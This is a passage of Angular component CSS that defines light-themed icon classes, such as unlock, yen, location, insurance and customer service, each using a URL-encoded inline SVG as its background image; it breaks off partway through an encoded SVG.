url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_upload%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C0%2C41%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C19V17a6%2C6%2C0%2C0%2C1%2C6-6H27a6%2C6%2C0%2C0%2C1%2C6%2C6v2H31V17a4%2C4%2C0%2C0%2C0-4-4H15a4%2C4%2C0%2C0%2C0-4%2C4v2Zm11%2C6v8h2V25h3.62L21%2C17l-4.62%2C8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-unlock-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_unlock%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C15V13h0A6%2C6%2C0%2C0%2C0%2C9%2C13H9v4h2V13a4%2C4%2C0%2C0%2C1%2C8%2C0v2H15V25a6%2C6%2C0%2C0%2C0%2C6%2C6h8a6%2C6%2C0%2C0%2C0%2C6-6V15ZM33%2C25a4%2C4%2C0%2C0%2C1-4%2C4H21a4%2C4%2C0%2C0%2C1-2.88-1.21L33%2C19.88V25Zm0-7.39L17.14%2C26A4%2C4%2C0%2C0%2C1%2C17%2C25h0V17H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-wear-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_wear%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C16a5%2C5%2C0%2C1%2C0%2C5%2C5A5%2C5%2C0%2C0%2C0%2C21%2C16Zm0%2C8a3%2C3%2C0%2C1%2C1%2C3-3A3%2C3%2C0%2C0%2C1%2C21%2C24Zm11-1.27a11.06%2C11.06%2C0%2C0%2C0%2C0-3.46l3.13-1.8-4-6.93L28%2C12.34a11.08%2C11.08%2C0%2C0%2C0-3-1.73V7H17v3.57a11%2C11%2C0%2C0%2C0-1.59.74%2C10.82%2C10.82%2C0%2C0%2C0-1.43%2C1l-3.1-1.79-4%2C6.93L10%2C19.27a11.28%2C11.28%2C0%2C0%2C0%2C0%2C3.46l-3.12%2C1.8h0l4%2C6.93L14%2C29.66a11.16%2C11.16%2C0%2C0%2C0%2C3%2C1.73V35h8V31.43a9.8%2C9.8%2C0%2C0%2C0%2C3-1.75l3.09%2C1.79%2C4-6.93Zm-1.6%2C6-2.57-1.48A8.72%2C8.72%2C0%2C0%2C1%2C23%2C30v3H19V30a9.23%2C9.23%2C0%2C0%2C1-4.84-2.77l-2.55%2C1.47-2-3.46%2C2.55-1.47a9.26%2C9.26%2C0%2C0%2C1%2C0-5.58L9.61%2C16.73l2-3.46%2C2.56%2C1.48A8.74%2C8.74%2C0%2C0%2C1%2C19%2C12V9h4v3a9.26%2C9.26%2C0%2C0%2C1%2C4.85%2C2.78l2.55-1.47%2C2%2C3.46L29.85%2C18.2a9.23%2C9.23%2C0%2C0%2C1%2C0%2C5.58l2.57%2C1.48Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-website-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_website%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C11V27a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6V11Zm6%2C4V13h2v2Zm-2-2v2H11V13ZM31%2C27a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4V17H31Zm0-12H19V13H31ZM18.61%2C21l8%2C.28-4.24%2C6.78L21%2C25.5l-5.3%2C2.82-.94-1.77%2C5.3-2.82Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-x-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_x%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2227.78%2013.63%2026.36%2012.22%2020%2018.59%2013.64%2012.22%2012.22%2013.64%2018.59%2020%2012.22%2026.36%2013.64%2027.78%2020%2021.41%2026.36%2027.78%2027.78%2026.36%2021.41%2020%2027.78%2013.63%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-yen-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_yen%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2221.01%2022%2025%2022%2025%2020%2021.01%2020%2021.01%2018.2%2030.57%2013.11%2029.63%2011.34%2019.98%2016.48%2010.33%2011.34%209.39%2013.11%2019.01%2018.23%2019.01%2020%2015%2020%2015%2022%2019.01%2022%2019.01%2024%2015%2024%2015%2026%2019.01%2026%2019.01%2032%2021.01%2032%2021.01%2026%2025%2026%2025%2024%2021.01%2024%2021.01%2022%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-location-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3Csvg%20width%3D%2240px%22%20height%3D%2240px%22%20viewBox%3D%220%200%2040%2040%22%20version%3D%221.1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%3E%0A%20%20%20%20%3C!--%20Generator%3A%20Sketch%2053.1%20%2872631%29%20-%20https%3A%2F%2Fsketchapp.com%20--%3E%0A%20%20%20%20%3Ctitle%3E050-location-white-circle%3C%2Ftitle%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C%2Fdesc%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22path-1%22%20cx%3D%2219%22%20cy%3D%2219%22%20r%3D%2219%22%3E%3C%2Fcircle%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M13.3858873%2C24.8179481%20C13.1858874%2C25.060684%2012.8141126%2C25.060684%2012.6141127%2C24.8179481%20C6.87428896%2C17.8516382%204%2C12.8371876%204%2C9.6710003%20C4%2C4.92164995%208.12532592%2C1%2013%2C1%20C17.8746741%2C1%2022%2C4.92164995%2022%2C9.6710003%20C22%2C12.8371876%2019.125711%2C17.8516382%2013.3858873%2C24.8179481%20Z%20M21%2C9.6710003%20C21%2C5.48557602%2017.3333961%2C2%2013%2C2%20C8.66660392%2C2%205%2C5.48557602%205%2C9.6710003%20C5%2C12.4554419%207.6639476%2C17.1677197%2013%2C23.7113019%20C18.3360524%2C17.1677197%2021%2C12.4554419%2021%2C9.6710003%20Z%20M13%2C15%20C10.2385763%2C15%208%2C12.7614237%208%2C10%20C8%2C7.23857625%2010.2385763%2C5%2013%2C5%20C15.7614237%2C5%2018%2C7.23857625%2018%2C10%20C18%2C12.7614237%2015.7614237%2C15%2013%2C15%20Z%20M13%2C14%20C15.209139%2C14%2017%2C12.209139%2017%2C10%20C17%2C7.790861%2015.209139%2C6%2013%2C6%20C10.790861%2C6%209%2C7.790861%209%2C10%20C9%2C12.209139%2010.790861%2C14%2013%2C14%20Z%22%20id%3D%22path-3%22%3E%3C%2Fpath%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20id%3D%22Symbols%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F01-template%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F02-circle%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Circle%22%20transform%3D%22translate%281.000000%2C%201.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-2%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-1%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Mask%22%20fill-rule%3D%22nonzero%22%3E%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fwhite%22%20mask%3D%22url%28%23mask-2%29%22%20fill%3D%22%23FFFFFF%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%28-1.000000%2C%20-1.000000%29%22%20id%3D%22Color-%2F-White%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20x%3D%220%22%20y%3D%220%22%20width%3D%2240%22%20height%3D%2240%22%3E%3C%2Frect%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2201-direction%2F050-location%22%20transform%3D%22translate%287.000000%2C%207.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-4%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-3%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20id%3D%22icon%22%20fill%3D%22%23056DAE%22%20fill-rule%3D%22evenodd%22%20xlink%3Ahref%3D%22%23path-3%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fb1%22%20mask%3D%22url%28%23mask-4%29%22%20fill%3D%22%23002A54%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20id%3D%22Color-%2F-B1%22%20x%3D%220%22%20y%3D%220%22%20width%3D%2226%22%20height%3D%2226%22%3E%3C%2Frect%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-ensurance-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3Csvg%20width%3D%2240px%22%20height%3D%2240px%22%20viewBox%3D%220%200%2040%2040%22%20version%3D%221.1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%3E%0A%20%20%20%20%3C!--%20Generator%3A%20Sketch%2053.1%20%2872631%29%20-%20https%3A%2F%2Fsketchapp.com%20--%3E%0A%20%20%20%20%3Ctitle%3E247-insurance-check-white-circle%3C%2Ftitle%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C%2Fdesc%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22path-1%22%20cx%3D%2219%22%20cy%3D%2219%22%20r%3D%2219%22%3E%3C%2Fcircle%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M20.082%2C10.4475%20L20.082%2C5.1675%20C20.082%2C4.5575%2019.681%2C4.0145%2019.08%2C3.8115%20L11%2C1.0825%20C10.676%2C0.9725%2010.323%2C0.9725%209.999%2C1.0835%20L1.997%2C3.8105%20C1.399%2C4.0145%201%2C4.5565%201%2C5.1655%20L1%2C13.7835%20C1%2C16.6375%202.396%2C19.3265%204.773%2C21.0465%20L9.599%2C24.5415%20C10.132%2C24.9265%2010.867%2C24.9275%2011.402%2C24.5435%20C12.106%2C23.9685%2012.588%2C23.5795%2012.859%2C23.3665%20C14.137%2C24.3755%2015.746%2C24.9815%2017.5%2C24.9815%20C21.643%2C24.9815%2025%2C21.6245%2025%2C17.4815%20C25%2C14.2485%2022.95%2C11.5015%2020.082%2C10.4475%20L20.082%2C10.4475%20Z%20M17.5%2C23.9815%20C13.91%2C23.9815%2011%2C21.0715%2011%2C17.4815%20C11%2C13.8915%2013.91%2C10.9815%2017.5%2C10.9815%20C21.09%2C10.9815%2024%2C13.8915%2024%2C17.4815%20C24%2C21.0715%2021.09%2C23.9815%2017.5%2C23.9815%20L17.5%2C23.9815%20Z%20M10%2C17.4815%20C10%2C18.2455%2010.116%2C18.9815%2010.328%2C19.6745%20C10.225%2C19.6695%2010.123%2C19.6395%2010.039%2C19.5725%20L6.723%2C16.9065%20C5.703%2C16.0865%205.115%2C14.8775%205.115%2C13.6035%20L5.115%2C7.6415%20C5.115%2C7.4385%205.248%2C7.2575%205.448%2C7.1895%20L10.186%2C5.5825%20C10.291%2C5.5465%2010.406%2C5.5455%2010.512%2C5.5795%20L15.545%2C7.1995%20C15.748%2C7.2645%2015.886%2C7.4475%2015.886%2C7.6535%20L15.886%2C10.1605%20C12.52%2C10.8995%2010%2C13.8945%2010%2C17.4815%20L10%2C17.4815%20Z%20M10.803%2C23.7775%20C10.624%2C23.9055%2010.379%2C23.9045%2010.201%2C23.7765%20L5.376%2C20.2825%20C3.25%2C18.7435%202%2C16.3365%202%2C13.7835%20L2%2C5.1655%20C2%2C4.9615%202.133%2C4.7815%202.333%2C4.7135%20L10.334%2C1.9855%20C10.442%2C1.9495%2010.56%2C1.9495%2010.668%2C1.9855%20L18.748%2C4.7145%20C18.948%2C4.7825%2019.082%2C4.9635%2019.082%2C5.1675%20L19.082%2C10.1515%20C18.571%2C10.0425%2018.043%2C9.9815%2017.5%2C9.9815%20C17.293%2C9.9815%2017.089%2C9.9965%2016.886%2C10.0125%20L16.886%2C7.6535%20C16.886%2C7.0365%2016.474%2C6.4875%2015.863%2C6.2915%20L10.83%2C4.6715%20C10.512%2C4.5695%2010.167%2C4.5715%209.852%2C4.6795%20L5.114%2C6.2865%20C4.515%2C6.4905%204.115%2C7.0325%204.115%2C7.6415%20L4.115%2C13.6035%20C4.115%2C15.1615%204.834%2C16.6385%206.08%2C17.6405%20L9.396%2C20.3065%20C9.763%2C20.6015%2010.238%2C20.6855%2010.681%2C20.5915%20C11.042%2C21.3805%2011.532%2C22.0975%2012.129%2C22.7105%20L10.803%2C23.7775%20Z%20M20.5146%2C15.2745%20C20.7046%2C15.0755%2021.0226%2C15.0685%2021.2216%2C15.2595%20C21.4206%2C15.4515%2021.4266%2C15.7675%2021.2366%2C15.9665%20L17.7936%2C19.5535%20L17.7716%2C19.5765%20C17.1866%2C20.1625%2016.2366%2C20.1625%2015.6506%2C19.5765%20L14.6466%2C18.5715%20C14.4516%2C18.3765%2014.4516%2C18.0595%2014.6466%2C17.8645%20C14.8416%2C17.6695%2015.1586%2C17.6695%2015.3536%2C17.8645%20L16.3576%2C18.8695%20C16.5526%2C19.0645%2016.8686%2C19.0645%2017.0646%2C18.8695%20C17.0676%2C18.8665%2018.2166%2C17.6685%2020.5146%2C15.2745%20Z%22%20id%3D%22path-3%22%3E%3C%2Fpath%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20id%3D%22Symbols%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F01-template%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F02-circle%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Circle%22%20transform%3D%22translate%281.000000%2C%201.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-2%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-1%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Mask%22%20fill-rule%3D%22nonzero%22%3E%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fwhite%22%20mask%3D%22url%28%23mask-2%29%22%20fill%3D%22%23FFFFFF%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%28-1.000000%2C%20-1.000000%29%22%20id%3D%22Color-%2F-White%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20x%3D%220%22%20y%3D%220%22%20width%3D%2240%22%20height%3D%2240%22%3E%3C%2Frect%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2210-service%2F247-insurance-check%22%20transform%3D%22translate%287.000000%2C%207.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-4%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-3%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20id%3D%22Mask%22%20fill%3D%22%23046EAE%22%20fill-rule%3D%22evenodd%22%20xlink%3Ahref%3D%22%23path-3%22%3E%3C%2Fuse%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fb1%22%20mask%3D%22url%28%23mask-4%29%22%20fill%3D%22%23002A54%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20id%3D%22Color-%2F-B1%22%20x%3D%220%22%20y%3D%220%22%20width%3D%2226%22%20height%3D%2226%22%3E%3C%2Frect%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-service-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20width%3D%2240px%22%20height%3D%2240px%22%20viewBox%3D%220%200%2040%2040%22%20version%3D%221.1%22%3E%0A%20%20%20%20%3C!--%20Generator%3A%20Sketch%2053.1%20%2872631%29%20-%20https%3A%2F%2Fsketchapp.com%20--%3E%0A%20%20%20%20%3Ctitle%3E125-customer-service-white-circle%3C%2Ftitle%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C%2Fdesc%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22path-1%22%20cx%3D%2219%22%20cy%3D%2219%22%20r%3D%2219%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M24%2C18%20C24%2C18.553%2023.553%2C19%2023%2C19%20L21%2C19%20L21%2C12%20L23%2C12%20C23.553%2C12%2024%2C12.448%2024%2C13%20L24%2C18%20Z%20M12%2C23%20L16%2C23%20L16%2C21%20L12%2C21%20L12%2C23%20Z%20M5%2C12%20L5%2C19%20L3%2C19%20C2.448%2C19%202%2C18.553%202%2C18%20L2%2C13%20C2%2C12.448%202.448%2C12%203%2C12%20L5%2C12%20Z%20M23%2C11%20C23%2C5.836%2018.729%2C2%2013.25%2C2%20C7.771%2C2%203.5%2C5.836%203.5%2C11%20L3%2C11%20C1.896%2C11%201%2C11.896%201%2C13%20L1%2C18%20C1%2C19.104%201.896%2C20%203%2C20%20L5%2C20%20C5.552%2C20%206%2C19.553%206%2C19%20L6%2C12%20C6%2C11.448%205.552%2C11%205%2C11%20L4.5%2C11%20C4.5%2C6.414%208.3%2C3%2013.25%2C3%20C18.2%2C3%2022%2C6.414%2022%2C11%20L21%2C11%20C20.447%2C11%2020%2C11.448%2020%2C12%20L20%2C19%20C20%2C19.516%2020.395%2C19.924%2020.896%2C19.979%20C20.264%2C20.599%2019.19%2C20.982%2017.189%2C21.418%20C17.146%2C21.428%2017.077%2C21.442%2017%2C21.459%20L17%2C21%20C17%2C20.447%2016.553%2C20%2016%2C20%20L12%2C20%20C11.448%2C20%2011%2C20.447%2011%2C21%20L11%2C23%20C11%2C23.553%2011.448%2C24%2012%2C24%20L16%2C24%20C16.553%2C24%2017%2C23.553%2017%2C23%20L17%2C22.482%20C17.169%2C22.445%2017.322%2C22.413%2017.402%2C22.396%20C20.15%2C21.796%2021.4%2C21.25%2022.135%2C20%20L23%2C20%20C24.104%2C20%2025%2C19.104%2025%2C18%20L25%2C13%20C25%2C11.896%2024.104%2C11%2023%2C11%20L23%2C11%20Z%22%20id%3D%22path-3%22%2F%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20id%3D%22Symbols%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F01-template%22%20transform%3D%22translate%28-1.000000%2C%200.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F02-circle%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Circle%22%20transform%3D%22translate%281.000000%2C%201.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-2%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-1%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Mask%22%20fill-rule%3D%22nonzero%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fwhite%22%20mask%3D%22url%28%23mask-2%29%22%20fill%3D%22%23FFFFFF%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%28-1.000000%2C%20-1.000000%29%22%20id%3D%22Color-%2F-White%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20x%3D%220%22%20y%3D%220%22%20width%3D%2240%22%20height%3D%2240%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%